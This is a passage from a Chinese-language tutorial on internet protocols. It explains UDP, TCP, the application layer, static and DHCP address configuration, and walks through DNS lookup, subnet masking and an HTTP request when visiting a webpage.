<p>\"\u6807\u5934\"\u90e8\u5206\u4e3b\u8981\u5b9a\u4e49\u4e86\u53d1\u51fa\u7aef\u53e3\u548c\u63a5\u6536\u7aef\u53e3\uff0c\"\u6570\u636e\"\u90e8\u5206\u5c31\u662f\u5177\u4f53\u7684\u5185\u5bb9\u3002\u7136\u540e\uff0c\u628a\u6574\u4e2aUDP\u6570\u636e\u5305\u653e\u5165IP\u6570\u636e\u5305\u7684\"\u6570\u636e\"\u90e8\u5206\uff0c\u800c\u524d\u9762\u8bf4\u8fc7\uff0cIP\u6570\u636e\u5305\u53c8\u662f\u653e\u5728\u4ee5\u592a\u7f51\u6570\u636e\u5305\u4e4b\u4e2d\u7684\uff0c\u6240\u4ee5\u6574\u4e2a\u4ee5\u592a\u7f51\u6570\u636e\u5305\u73b0\u5728\u53d8\u6210\u4e86\u4e0b\u9762\u8fd9\u6837\uff1a</p> <p></p> <p>UDP\u6570\u636e\u5305\u975e\u5e38\u7b80\u5355\uff0c\"\u6807\u5934\"\u90e8\u5206\u4e00\u5171\u53ea\u67098\u4e2a\u5b57\u8282\uff0c\u603b\u957f\u5ea6\u4e0d\u8d85\u8fc765,535\u5b57\u8282\uff0c\u6b63\u597d\u653e\u8fdb\u4e00\u4e2aIP\u6570\u636e\u5305\u3002</p> <p>5.3 TCP\u534f\u8bae</p> <p>UDP\u534f\u8bae\u7684\u4f18\u70b9\u662f\u6bd4\u8f83\u7b80\u5355\uff0c\u5bb9\u6613\u5b9e\u73b0\uff0c\u4f46\u662f\u7f3a\u70b9\u662f\u53ef\u9760\u6027\u8f83\u5dee\uff0c\u4e00\u65e6\u6570\u636e\u5305\u53d1\u51fa\uff0c\u65e0\u6cd5\u77e5\u9053\u5bf9\u65b9\u662f\u5426\u6536\u5230\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u63d0\u9ad8\u7f51\u7edc\u53ef\u9760\u6027\uff0cTCP\u534f\u8bae\u5c31\u8bde\u751f\u4e86\u3002\u8fd9\u4e2a\u534f\u8bae\u975e\u5e38\u590d\u6742\uff0c\u4f46\u53ef\u4ee5\u8fd1\u4f3c\u8ba4\u4e3a\uff0c\u5b83\u5c31\u662f\u6709\u786e\u8ba4\u673a\u5236\u7684UDP\u534f\u8bae\uff0c\u6bcf\u53d1\u51fa\u4e00\u4e2a\u6570\u636e\u5305\u90fd\u8981\u6c42\u786e\u8ba4\u3002\u5982\u679c\u6709\u4e00\u4e2a\u6570\u636e\u5305\u9057\u5931\uff0c\u5c31\u6536\u4e0d\u5230\u786e\u8ba4\uff0c\u53d1\u51fa\u65b9\u5c31\u77e5\u9053\u6709\u5fc5\u8981\u91cd\u53d1\u8fd9\u4e2a\u6570\u636e\u5305\u4e86\u3002</p> <p>\u56e0\u6b64\uff0cTCP\u534f\u8bae\u80fd\u591f\u786e\u4fdd\u6570\u636e\u4e0d\u4f1a\u9057\u5931\u3002\u5b83\u7684\u7f3a\u70b9\u662f\u8fc7\u7a0b\u590d\u6742\u3001\u5b9e\u73b0\u56f0\u96be\u3001\u6d88\u8017\u8f83\u591a\u7684\u8d44\u6e90\u3002</p> <p>TCP\u6570\u636e\u5305\u548cUDP\u6570\u636e\u5305\u4e00\u6837\uff0c\u90fd\u662f\u5185\u5d4c\u5728IP\u6570\u636e\u5305\u7684\"\u6570\u636e\"\u90e8\u5206\u3002TCP\u6570\u636e\u5305\u6ca1\u6709\u957f\u5ea6\u9650\u5236\uff0c\u7406\u8bba\u4e0a\u53ef\u4ee5\u65e0\u9650\u957f\uff0c\u4f46\u662f\u4e3a\u4e86\u4fdd\u8bc1\u7f51\u7edc\u7684\u6548\u7387\uff0c\u901a\u5e38TCP\u6570\u636e\u5305\u7684\u957f\u5ea6\u4e0d\u4f1a\u8d85\u8fc7IP\u6570\u636e\u5305\u7684\u957f\u5ea6\uff0c\u4ee5\u786e\u4fdd\u5355\u4e2aTCP\u6570\u636e\u5305\u4e0d\u5fc5\u518d\u5206\u5272\u3002</p> <p>\u516d\u3001\u5e94\u7528\u5c42</p> <p>\u5e94\u7528\u7a0b\u5e8f\u6536\u5230\"\u4f20\u8f93\u5c42\"\u7684\u6570\u636e\uff0c\u63a5\u4e0b\u6765\u5c31\u8981\u8fdb\u884c\u89e3\u8bfb\u3002\u7531\u4e8e\u4e92\u8054\u7f51\u662f\u5f00\u653e\u67b6\u6784\uff0c\u6570\u636e\u6765\u6e90\u4e94\u82b1\u516b\u95e8\uff0c\u5fc5\u987b\u4e8b\u5148\u89c4\u5b9a\u597d\u683c\u5f0f\uff0c\u5426\u5219\u6839\u672c\u65e0\u6cd5\u89e3\u8bfb\u3002</p> <p>\"\u5e94\u7528\u5c42\"\u7684\u4f5c\u7528\uff0c\u5c31\u662f\u89c4\u5b9a\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u683c\u5f0f\u3002</p> <p>\u4e3e\u4f8b\u6765\u8bf4\uff0cTCP\u534f\u8bae\u53ef\u4ee5\u4e3a\u5404\u79cd\u5404\u6837\u7684\u7a0b\u5e8f\u4f20\u9012\u6570\u636e\uff0c\u6bd4\u5982Email\u3001WWW\u3001FTP\u7b49\u7b49\u3002\u90a3\u4e48\uff0c\u5fc5\u987b\u6709\u4e0d\u540c\u534f\u8bae\u89c4\u5b9a\u7535\u5b50\u90ae\u4ef6\u3001\u7f51\u9875\u3001FTP\u6570\u636e\u7684\u683c\u5f0f\uff0c\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u534f\u8bae\u5c31\u6784\u6210\u4e86\"\u5e94\u7528\u5c42\"\u3002</p> <p>\u8fd9\u662f\u6700\u9ad8\u7684\u4e00\u5c42\uff0c\u76f4\u63a5\u9762\u5bf9\u7528\u6237\u3002\u5b83\u7684\u6570\u636e\u5c31\u653e\u5728TCP\u6570\u636e\u5305\u7684\"\u6570\u636e\"\u90e8\u5206\u3002\u56e0\u6b64\uff0c\u73b0\u5728\u7684\u4ee5\u592a\u7f51\u7684\u6570\u636e\u5305\u5c31\u53d8\u6210\u4e0b\u9762\u8fd9\u6837\u3002</p> <p></p> <p>\u81f3\u6b64\uff0c\u6574\u4e2a\u4e92\u8054\u7f51\u7684\u4e94\u5c42\u7ed3\u6784\uff0c\u81ea\u4e0b\u800c\u4e0a\u5168\u90e8\u8bb2\u5b8c\u4e86\u3002\u8fd9\u662f\u4ece\u7cfb\u7edf\u7684\u89d2\u5ea6\uff0c\u89e3\u91ca\u4e92\u8054\u7f51\u662f\u5982\u4f55\u6784\u6210\u7684\u3002\u4e0b\u4e00\u7bc7\uff0c\u6211\u53cd\u8fc7\u6765\uff0c\u4ece\u7528\u6237\u7684\u89d2\u5ea6\uff0c\u81ea\u4e0a\u800c\u4e0b\u770b\u770b\u8fd9\u4e2a\u7ed3\u6784\u662f\u5982\u4f55\u53d1\u6325\u4f5c\u7528\uff0c\u5b8c\u6210\u4e00\u6b21\u7f51\u7edc\u6570\u636e\u4ea4\u6362\u7684\u3002</p> <p>\u4e03\u3001\u4e00\u4e2a\u5c0f\u7ed3</p> <p>\u5148\u5bf9\u524d\u9762\u7684\u5185\u5bb9\uff0c\u505a\u4e00\u4e2a\u5c0f\u7ed3\u3002</p> <p>\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\uff0c\u7f51\u7edc\u901a\u4fe1\u5c31\u662f\u4ea4\u6362\u6570\u636e\u5305\u3002\u7535\u8111A\u5411\u7535\u8111B\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5305\uff0c\u540e\u8005\u6536\u5230\u4e86\uff0c\u56de\u590d\u4e00\u4e2a\u6570\u636e\u5305\uff0c\u4ece\u800c\u5b9e\u73b0\u4e24\u53f0\u7535\u8111\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u6570\u636e\u5305\u7684\u7ed3\u6784\uff0c\u57fa\u672c\u4e0a\u662f\u4e0b\u9762\u8fd9\u6837\uff1a</p> <p></p> <p>\u53d1\u9001\u8fd9\u4e2a\u5305\uff0c\u9700\u8981\u77e5\u9053\u4e24\u4e2a\u5730\u5740\uff1a</p> <p>* \u5bf9\u65b9\u7684MAC\u5730\u5740</p> <p>* \u5bf9\u65b9\u7684IP\u5730\u5740</p> <p>\u6709\u4e86\u8fd9\u4e24\u4e2a\u5730\u5740\uff0c\u6570\u636e\u5305\u624d\u80fd\u51c6\u786e\u9001\u5230\u63a5\u6536\u8005\u624b\u4e2d\u3002\u4f46\u662f\uff0c\u524d\u9762\u8bf4\u8fc7\uff0cMAC\u5730\u5740\u6709\u5c40\u9650\u6027\uff0c\u5982\u679c\u4e24\u53f0\u7535\u8111\u4e0d\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u5c31\u65e0\u6cd5\u77e5\u9053\u5bf9\u65b9\u7684MAC\u5730\u5740\uff0c\u5fc5\u987b\u901a\u8fc7\u7f51\u5173\uff08gateway\uff09\u8f6c\u53d1\u3002</p> <p></p> <p>\u4e0a\u56fe\u4e2d\uff0c1\u53f7\u7535\u8111\u8981\u54114\u53f7\u7535\u8111\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5305\u3002\u5b83\u5148\u5224\u65ad4\u53f7\u7535\u8111\u662f\u5426\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u7ed3\u679c\u53d1\u73b0\u4e0d\u662f\uff08\u540e\u6587\u4ecb\u7ecd\u5224\u65ad\u65b9\u6cd5\uff09\uff0c\u4e8e\u662f\u5c31\u628a\u8fd9\u4e2a\u6570\u636e\u5305\u53d1\u5230\u7f51\u5173A\u3002\u7f51\u5173A\u901a\u8fc7\u8def\u7531\u534f\u8bae\uff0c\u53d1\u73b04\u53f7\u7535\u8111\u4f4d\u4e8e\u5b50\u7f51\u7edcB\uff0c\u53c8\u628a\u6570\u636e\u5305\u53d1\u7ed9\u7f51\u5173B\uff0c\u7f51\u5173B\u518d\u8f6c\u53d1\u52304\u53f7\u7535\u8111\u3002</p> <p>1\u53f7\u7535\u8111\u628a\u6570\u636e\u5305\u53d1\u5230\u7f51\u5173A\uff0c\u5fc5\u987b\u77e5\u9053\u7f51\u5173A\u7684MAC\u5730\u5740\u3002\u6240\u4ee5\uff0c\u6570\u636e\u5305\u7684\u76ee\u6807\u5730\u5740\uff0c\u5b9e\u9645\u4e0a\u5206\u6210\u4e24\u79cd\u60c5\u51b5\uff1a</p> \u573a\u666f \u6570\u636e\u5305\u5730\u5740 \u540c\u4e00\u4e2a\u5b50\u7f51\u7edc \u5bf9\u65b9\u7684MAC\u5730\u5740\uff0c\u5bf9\u65b9\u7684IP\u5730\u5740 \u975e\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc \u7f51\u5173\u7684MAC\u5730\u5740\uff0c\u5bf9\u65b9\u7684IP\u5730\u5740 <p>\u53d1\u9001\u6570\u636e\u5305\u4e4b\u524d\uff0c\u7535\u8111\u5fc5\u987b\u5224\u65ad\u5bf9\u65b9\u662f\u5426\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u7136\u540e\u9009\u62e9\u76f8\u5e94\u7684MAC\u5730\u5740\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c31\u6765\u770b\uff0c\u5b9e\u9645\u4f7f\u7528\u4e2d\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u600e\u4e48\u5b8c\u6210\u7684\u3002</p> <p>\u516b\u3001\u7528\u6237\u7684\u4e0a\u7f51\u8bbe\u7f6e</p> <p>8.1 \u9759\u6001IP\u5730\u5740</p> <p>\u4f60\u4e70\u4e86\u4e00\u53f0\u65b0\u7535\u8111\uff0c\u63d2\u4e0a\u7f51\u7ebf\uff0c\u5f00\u673a\uff0c\u8fd9\u65f6\u7535\u8111\u80fd\u591f\u4e0a\u7f51\u5417\uff1f</p> <p></p> <p>\u901a\u5e38\u4f60\u5fc5\u987b\u505a\u4e00\u4e9b\u8bbe\u7f6e\u3002\u6709\u65f6\uff0c\u7ba1\u7406\u5458\uff08\u6216\u8005ISP\uff09\u4f1a\u544a\u8bc9\u4f60\u4e0b\u9762\u56db\u4e2a\u53c2\u6570\uff0c\u4f60\u628a\u5b83\u4eec\u586b\u5165\u64cd\u4f5c\u7cfb\u7edf\uff0c\u8ba1\u7b97\u673a\u5c31\u80fd\u8fde\u4e0a\u7f51\u4e86\uff1a</p> <p>* \u672c\u673a\u7684IP\u5730\u5740 \u3000\u3000* \u5b50\u7f51\u63a9\u7801 \u3000\u3000* \u7f51\u5173\u7684IP\u5730\u5740 \u3000\u3000* DNS\u7684IP\u5730\u5740</p> <p>\u4e0b\u56fe\u662fWindows\u7cfb\u7edf\u7684\u8bbe\u7f6e\u7a97\u53e3\u3002</p> <p></p> <p>\u8fd9\u56db\u4e2a\u53c2\u6570\u7f3a\u4e00\u4e0d\u53ef\uff0c\u540e\u6587\u4f1a\u89e3\u91ca\u4e3a\u4ec0\u4e48\u9700\u8981\u77e5\u9053\u5b83\u4eec\u624d\u80fd\u4e0a\u7f51\u3002\u7531\u4e8e\u5b83\u4eec\u662f\u7ed9\u5b9a\u7684\uff0c\u8ba1\u7b97\u673a\u6bcf\u6b21\u5f00\u673a\uff0c\u90fd\u4f1a\u5206\u5230\u540c\u6837\u7684IP\u5730\u5740\uff0c\u6240\u4ee5\u8fd9\u79cd\u60c5\u51b5\u88ab\u79f0\u4f5c\"\u9759\u6001IP\u5730\u5740\u4e0a\u7f51\"\u3002</p> <p>\u4f46\u662f\uff0c\u8fd9\u6837\u7684\u8bbe\u7f6e\u5f88\u4e13\u4e1a\uff0c\u666e\u901a\u7528\u6237\u671b\u800c\u751f\u754f\uff0c\u800c\u4e14\u5982\u679c\u4e00\u53f0\u7535\u8111\u7684IP\u5730\u5740\u4fdd\u6301\u4e0d\u53d8\uff0c\u5176\u4ed6\u7535\u8111\u5c31\u4e0d\u80fd\u4f7f\u7528\u8fd9\u4e2a\u5730\u5740\uff0c\u4e0d\u591f\u7075\u6d3b\u3002\u51fa\u4e8e\u8fd9\u4e24\u4e2a\u539f\u56e0\uff0c\u5927\u591a\u6570\u7528\u6237\u4f7f\u7528\"\u52a8\u6001IP\u5730\u5740\u4e0a\u7f51\"\u3002</p> <p>8.2 \u52a8\u6001IP\u5730\u5740</p> <p>\u6240\u8c13\"\u52a8\u6001IP\u5730\u5740\"\uff0c\u6307\u8ba1\u7b97\u673a\u5f00\u673a\u540e\uff0c\u4f1a\u81ea\u52a8\u5206\u914d\u5230\u4e00\u4e2aIP\u5730\u5740\uff0c\u4e0d\u7528\u4eba\u4e3a\u8bbe\u5b9a\u3002\u5b83\u4f7f\u7528\u7684\u534f\u8bae\u53eb\u505aDHCP\u534f\u8bae\u3002</p> <p>\u8fd9\u4e2a\u534f\u8bae\u89c4\u5b9a\uff0c\u6bcf\u4e00\u4e2a\u5b50\u7f51\u7edc\u4e2d\uff0c\u6709\u4e00\u53f0\u8ba1\u7b97\u673a\u8d1f\u8d23\u7ba1\u7406\u672c\u7f51\u7edc\u7684\u6240\u6709IP\u5730\u5740\uff0c\u5b83\u53eb\u505a\"DHCP\u670d\u52a1\u5668\"\u3002\u65b0\u7684\u8ba1\u7b97\u673a\u52a0\u5165\u7f51\u7edc\uff0c\u5fc5\u987b\u5411\"DHCP\u670d\u52a1\u5668\"\u53d1\u9001\u4e00\u4e2a\"DHCP\u8bf7\u6c42\"\u6570\u636e\u5305\uff0c\u7533\u8bf7IP\u5730\u5740\u548c\u76f8\u5173\u7684\u7f51\u7edc\u53c2\u6570\u3002</p> <p>\u524d\u9762\u8bf4\u8fc7\uff0c\u5982\u679c\u4e24\u53f0\u8ba1\u7b97\u673a\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u5fc5\u987b\u77e5\u9053\u5bf9\u65b9\u7684MAC\u5730\u5740\u548cIP\u5730\u5740\uff0c\u624d\u80fd\u53d1\u9001\u6570\u636e\u5305\u3002\u4f46\u662f\uff0c\u65b0\u52a0\u5165\u7684\u8ba1\u7b97\u673a\u4e0d\u77e5\u9053\u8fd9\u4e24\u4e2a\u5730\u5740\uff0c\u600e\u4e48\u53d1\u9001\u6570\u636e\u5305\u5462\uff1f</p> <p>DHCP\u534f\u8bae\u505a\u4e86\u4e00\u4e9b\u5de7\u5999\u7684\u89c4\u5b9a\u3002</p> <p>8.3 DHCP\u534f\u8bae</p> <p>\u9996\u5148\uff0c\u5b83\u662f\u4e00\u79cd\u5e94\u7528\u5c42\u534f\u8bae\uff0c\u5efa\u7acb\u5728UDP\u534f\u8bae\u4e4b\u4e0a\uff0c\u6240\u4ee5\u6574\u4e2a\u6570\u636e\u5305\u662f\u8fd9\u6837\u7684\uff1a</p> <p></p> <p>\uff081\uff09\u6700\u524d\u9762\u7684\"\u4ee5\u592a\u7f51\u6807\u5934\"\uff0c\u8bbe\u7f6e\u53d1\u51fa\u65b9\uff08\u672c\u673a\uff09\u7684MAC\u5730\u5740\u548c\u63a5\u6536\u65b9\uff08DHCP\u670d\u52a1\u5668\uff09\u7684MAC\u5730\u5740\u3002\u524d\u8005\u5c31\u662f\u672c\u673a\u7f51\u5361\u7684MAC\u5730\u5740\uff0c\u540e\u8005\u8fd9\u65f6\u4e0d\u77e5\u9053\uff0c\u5c31\u586b\u5165\u4e00\u4e2a\u5e7f\u64ad\u5730\u5740\uff1aFF-FF-FF-FF-FF-FF\u3002</p> <p>\uff082\uff09\u540e\u9762\u7684\"IP\u6807\u5934\"\uff0c\u8bbe\u7f6e\u53d1\u51fa\u65b9\u7684IP\u5730\u5740\u548c\u63a5\u6536\u65b9\u7684IP\u5730\u5740\u3002\u8fd9\u65f6\uff0c\u5bf9\u4e8e\u8fd9\u4e24\u8005\uff0c\u672c\u673a\u90fd\u4e0d\u77e5\u9053\u3002\u4e8e\u662f\uff0c\u53d1\u51fa\u65b9\u7684IP\u5730\u5740\u5c31\u8bbe\u4e3a0.0.0.0\uff0c\u63a5\u6536\u65b9\u7684IP\u5730\u5740\u8bbe\u4e3a255.255.255.255\u3002</p> <p>\uff083\uff09\u6700\u540e\u7684\"UDP\u6807\u5934\"\uff0c\u8bbe\u7f6e\u53d1\u51fa\u65b9\u7684\u7aef\u53e3\u548c\u63a5\u6536\u65b9\u7684\u7aef\u53e3\u3002\u8fd9\u4e00\u90e8\u5206\u662fDHCP\u534f\u8bae\u89c4\u5b9a\u597d\u7684\uff0c\u53d1\u51fa\u65b9\u662f68\u7aef\u53e3\uff0c\u63a5\u6536\u65b9\u662f67\u7aef\u53e3\u3002</p> <p>\u8fd9\u4e2a\u6570\u636e\u5305\u6784\u9020\u5b8c\u6210\u540e\uff0c\u5c31\u53ef\u4ee5\u53d1\u51fa\u4e86\u3002\u4ee5\u592a\u7f51\u662f\u5e7f\u64ad\u53d1\u9001\uff0c\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u7684\u6bcf\u53f0\u8ba1\u7b97\u673a\u90fd\u6536\u5230\u4e86\u8fd9\u4e2a\u5305\u3002\u56e0\u4e3a\u63a5\u6536\u65b9\u7684MAC\u5730\u5740\u662fFF-FF-FF-FF-FF-FF\uff0c\u770b\u4e0d\u51fa\u662f\u53d1\u7ed9\u8c01\u7684\uff0c\u6240\u4ee5\u6bcf\u53f0\u6536\u5230\u8fd9\u4e2a\u5305\u7684\u8ba1\u7b97\u673a\uff0c\u8fd8\u5fc5\u987b\u5206\u6790\u8fd9\u4e2a\u5305\u7684IP\u5730\u5740\uff0c\u624d\u80fd\u786e\u5b9a\u662f\u4e0d\u662f\u53d1\u7ed9\u81ea\u5df1\u7684\u3002\u5f53\u770b\u5230\u53d1\u51fa\u65b9IP\u5730\u5740\u662f0.0.0.0\uff0c\u63a5\u6536\u65b9\u662f255.255.255.255\uff0c\u4e8e\u662fDHCP\u670d\u52a1\u5668\u77e5\u9053\"\u8fd9\u4e2a\u5305\u662f\u53d1\u7ed9\u6211\u7684\"\uff0c\u800c\u5176\u4ed6\u8ba1\u7b97\u673a\u5c31\u53ef\u4ee5\u4e22\u5f03\u8fd9\u4e2a\u5305\u3002</p> <p>\u63a5\u4e0b\u6765\uff0cDHCP\u670d\u52a1\u5668\u8bfb\u51fa\u8fd9\u4e2a\u5305\u7684\u6570\u636e\u5185\u5bb9\uff0c\u5206\u914d\u597dIP\u5730\u5740\uff0c\u53d1\u9001\u56de\u53bb\u4e00\u4e2a\"DHCP\u54cd\u5e94\"\u6570\u636e\u5305\u3002\u8fd9\u4e2a\u54cd\u5e94\u5305\u7684\u7ed3\u6784\u4e5f\u662f\u7c7b\u4f3c\u7684\uff0c\u4ee5\u592a\u7f51\u6807\u5934\u7684MAC\u5730\u5740\u662f\u53cc\u65b9\u7684\u7f51\u5361\u5730\u5740\uff0cIP\u6807\u5934\u7684IP\u5730\u5740\u662fDHCP\u670d\u52a1\u5668\u7684IP\u5730\u5740\uff08\u53d1\u51fa\u65b9\uff09\u548c255.255.255.255\uff08\u63a5\u6536\u65b9\uff09\uff0cUDP\u6807\u5934\u7684\u7aef\u53e3\u662f67\uff08\u53d1\u51fa\u65b9\uff09\u548c68\uff08\u63a5\u6536\u65b9\uff09\uff0c\u5206\u914d\u7ed9\u8bf7\u6c42\u7aef\u7684IP\u5730\u5740\u548c\u672c\u7f51\u7edc\u7684\u5177\u4f53\u53c2\u6570\u5219\u5305\u542b\u5728Data\u90e8\u5206\u3002</p> <p>\u65b0\u52a0\u5165\u7684\u8ba1\u7b97\u673a\u6536\u5230\u8fd9\u4e2a\u54cd\u5e94\u5305\uff0c\u4e8e\u662f\u5c31\u77e5\u9053\u4e86\u81ea\u5df1\u7684IP\u5730\u5740\u3001\u5b50\u7f51\u63a9\u7801\u3001\u7f51\u5173\u5730\u5740\u3001DNS\u670d\u52a1\u5668\u7b49\u7b49\u53c2\u6570\u3002</p> <p>8.4 \u4e0a\u7f51\u8bbe\u7f6e\uff1a\u5c0f\u7ed3</p> <p>\u8fd9\u4e2a\u90e8\u5206\uff0c\u9700\u8981\u8bb0\u4f4f\u7684\u5c31\u662f\u4e00\u70b9\uff1a\u4e0d\u7ba1\u662f\"\u9759\u6001IP\u5730\u5740\"\u8fd8\u662f\"\u52a8\u6001IP\u5730\u5740\"\uff0c\u7535\u8111\u4e0a\u7f51\u7684\u9996\u8981\u6b65\u9aa4\uff0c\u662f\u786e\u5b9a\u56db\u4e2a\u53c2\u6570\u3002\u8fd9\u56db\u4e2a\u503c\u5f88\u91cd\u8981\uff0c\u503c\u5f97\u91cd\u590d\u4e00\u904d\uff1a</p> <p>* \u672c\u673a\u7684IP\u5730\u5740 \u3000\u3000* \u5b50\u7f51\u63a9\u7801 \u3000\u3000* \u7f51\u5173\u7684IP\u5730\u5740 \u3000\u3000* DNS\u7684IP\u5730\u5740</p> <p>\u6709\u4e86\u8fd9\u51e0\u4e2a\u6570\u503c\uff0c\u7535\u8111\u5c31\u53ef\u4ee5\u4e0a\u7f51\"\u51b2\u6d6a\"\u4e86\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u7f51\u9875\u7684\u65f6\u5019\uff0c\u4e92\u8054\u7f51\u534f\u8bae\u662f\u600e\u4e48\u8fd0\u4f5c\u7684\u3002</p> <p>\u4e5d\u3001\u4e00\u4e2a\u5b9e\u4f8b\uff1a\u8bbf\u95ee\u7f51\u9875</p> <p>9.1 \u672c\u673a\u53c2\u6570</p> <p>\u6211\u4eec\u5047\u5b9a\uff0c\u7ecf\u8fc7\u4e0a\u4e00\u8282\u7684\u6b65\u9aa4\uff0c\u7528\u6237\u8bbe\u7f6e\u597d\u4e86\u81ea\u5df1\u7684\u7f51\u7edc\u53c2\u6570\uff1a</p> <p>* \u672c\u673a\u7684IP\u5730\u5740\uff1a192.168.1.100 \u3000\u3000* \u5b50\u7f51\u63a9\u7801\uff1a255.255.255.0 \u3000\u3000* \u7f51\u5173\u7684IP\u5730\u5740\uff1a192.168.1.1 \u3000\u3000* DNS\u7684IP\u5730\u5740\uff1a8.8.8.8</p> <p>\u7136\u540e\u4ed6\u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u60f3\u8981\u8bbf\u95eeGoogle\uff0c\u5728\u5730\u5740\u680f\u8f93\u5165\u4e86\u7f51\u5740\uff1awww.google.com\u3002</p> <p></p> <p>\u8fd9\u610f\u5473\u7740\uff0c\u6d4f\u89c8\u5668\u8981\u5411Google\u53d1\u9001\u4e00\u4e2a\u7f51\u9875\u8bf7\u6c42\u7684\u6570\u636e\u5305\u3002</p> <p>9.2 DNS\u534f\u8bae</p> <p>\u6211\u4eec\u77e5\u9053\uff0c\u53d1\u9001\u6570\u636e\u5305\uff0c\u5fc5\u987b\u8981\u77e5\u9053\u5bf9\u65b9\u7684IP\u5730\u5740\u3002\u4f46\u662f\uff0c\u73b0\u5728\uff0c\u6211\u4eec\u53ea\u77e5\u9053\u7f51\u5740www.google.com\uff0c\u4e0d\u77e5\u9053\u5b83\u7684IP\u5730\u5740\u3002</p> <p>DNS\u534f\u8bae\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\uff0c\u5c06\u8fd9\u4e2a\u7f51\u5740\u8f6c\u6362\u6210IP\u5730\u5740\u3002\u5df2\u77e5DNS\u670d\u52a1\u5668\u4e3a8.8.8.8\uff0c\u4e8e\u662f\u6211\u4eec\u5411\u8fd9\u4e2a\u5730\u5740\u53d1\u9001\u4e00\u4e2aDNS\u6570\u636e\u5305\uff0853\u7aef\u53e3\uff09\u3002</p> <p></p> <p>\u7136\u540e\uff0cDNS\u670d\u52a1\u5668\u505a\u51fa\u54cd\u5e94\uff0c\u544a\u8bc9\u6211\u4eecGoogle\u7684IP\u5730\u5740\u662f172.194.72.105\u3002\u4e8e\u662f\uff0c\u6211\u4eec\u77e5\u9053\u4e86\u5bf9\u65b9\u7684IP\u5730\u5740\u3002</p> <p>9.3 \u5b50\u7f51\u63a9\u7801</p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u8981\u5224\u65ad\uff0c\u8fd9\u4e2aIP\u5730\u5740\u662f\u4e0d\u662f\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u8fd9\u5c31\u8981\u7528\u5230\u5b50\u7f51\u63a9\u7801\u3002</p> <p>\u5df2\u77e5\u5b50\u7f51\u63a9\u7801\u662f255.255.255.0\uff0c\u672c\u673a\u7528\u5b83\u5bf9\u81ea\u5df1\u7684IP\u5730\u5740192.168.1.100\uff0c\u505a\u4e00\u4e2a\u4e8c\u8fdb\u5236\u7684AND\u8fd0\u7b97\uff08\u4e24\u4e2a\u6570\u4f4d\u90fd\u4e3a1\uff0c\u7ed3\u679c\u4e3a1\uff0c\u5426\u5219\u4e3a0\uff09\uff0c\u8ba1\u7b97\u7ed3\u679c\u4e3a192.168.1.0\uff1b\u7136\u540e\u5bf9Google\u7684IP\u5730\u5740172.194.72.105\u4e5f\u505a\u4e00\u4e2aAND\u8fd0\u7b97\uff0c\u8ba1\u7b97\u7ed3\u679c\u4e3a172.194.72.0\u3002\u8fd9\u4e24\u4e2a\u7ed3\u679c\u4e0d\u76f8\u7b49\uff0c\u6240\u4ee5\u7ed3\u8bba\u662f\uff0cGoogle\u4e0e\u672c\u673a\u4e0d\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u8981\u5411Google\u53d1\u9001\u6570\u636e\u5305\uff0c\u5fc5\u987b\u901a\u8fc7\u7f51\u5173192.168.1.1\u8f6c\u53d1\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u63a5\u6536\u65b9\u7684MAC\u5730\u5740\u5c06\u662f\u7f51\u5173\u7684MAC\u5730\u5740\u3002</p> <p>9.4 \u5e94\u7528\u5c42\u534f\u8bae</p> <p>\u6d4f\u89c8\u7f51\u9875\u7528\u7684\u662fHTTP\u534f\u8bae\uff0c\u5b83\u7684\u6574\u4e2a\u6570\u636e\u5305\u6784\u9020\u662f\u8fd9\u6837\u7684\uff1a</p> <p></p> <p>HTTP\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u8fd9\u6837\uff1a</p> <p>GET / HTTP/1.1 \u3000\u3000Host: www.google.com \u3000\u3000Connection: keep-alive \u3000\u3000User-Agent: Mozilla/5.0 (Windows NT 6.1) ...... \u3000\u3000Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 \u3000\u3000Accept-Encoding: gzip,deflate,sdch \u3000\u3000Accept-Language: zh-CN,zh;q=0.8 \u3000\u3000Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3 \u3000\u3000Cookie: ... ...</p> <p>\u6211\u4eec\u5047\u5b9a\u8fd9\u4e2a\u90e8\u5206\u7684\u957f\u5ea6\u4e3a4960\u5b57\u8282\uff0c\u5b83\u4f1a\u88ab\u5d4c\u5728TCP\u6570\u636e\u5305\u4e4b\u4e2d\u3002</p> <p>9.5 TCP\u534f\u8bae</p> <p>TCP\u6570\u636e\u5305\u9700\u8981\u8bbe\u7f6e\u7aef\u53e3\uff0c\u63a5\u6536\u65b9\uff08Google\uff09\u7684HTTP\u7aef\u53e3\u9ed8\u8ba4\u662f80\uff0c\u53d1\u9001\u65b9\uff08\u672c\u673a\uff09\u7684\u7aef\u53e3\u662f\u4e00\u4e2a\u968f\u673a\u751f\u6210\u76841024-65535\u4e4b\u95f4\u7684\u6574\u6570\uff0c\u5047\u5b9a\u4e3a51775\u3002</p> 